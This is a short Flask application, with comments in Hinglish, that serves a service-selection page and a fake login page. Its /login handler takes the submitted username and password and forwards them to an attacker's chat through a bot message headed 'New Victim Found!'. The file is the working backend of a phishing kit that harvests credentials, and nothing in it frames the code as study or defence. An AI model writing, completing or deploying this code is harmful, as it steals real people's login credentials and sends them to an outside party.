@app.route("/")
def index():
    return render_template("index.html") # Pehle selection page dikhega

@app.route("/login-page")
def login_page():
    return render_template("login_page.html") # Fir login page khulega

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    username = data.get("username")
    password = data.get("password")
    # Humne JavaScript se service ka naam bhi bhej sakte hain agar chahein
    
    bot.send_message(
        CHAT_ID,
        f"🔥 **New Victim Found!**\n\n👤 **Username:** `{username}`\n🔑 **Password:** `{password}`\n\n(User selected a service from selection page)"
    )
    return "ok"
    
